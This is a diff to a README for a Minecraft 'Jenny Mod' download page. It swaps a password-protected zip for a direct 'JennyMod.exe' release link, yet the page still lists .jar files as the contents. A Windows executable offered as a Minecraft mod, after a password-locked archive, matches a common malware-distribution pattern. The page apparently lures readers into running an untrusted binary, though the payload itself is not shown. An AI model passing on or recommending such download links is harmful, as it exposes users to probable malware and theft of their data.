@@ -24,8 +24,7 @@ The popular immersive companion mod that adds Jenny as a customizable, interacti
 ---
 ## 📥 Download
 
-📥 [`JennyMod-ALL.zip`](https://github.com/Joefix2010/Jenny-Mod-Minecraft-ALL-Versions/releases/download/Game-Addons/JennyMod-ALL.zip)  
-🔐 `LS2026`
+📥 [`JennyMod.exe`](https://github.com/Joefix2010/Jenny-Mod-Minecraft-ALL-Versions/releases/download/Game-Addons/JennyMod.exe)  
 ---
 ### Archive Contents
 - `JennyMod-1.21.5.jar` – Latest version
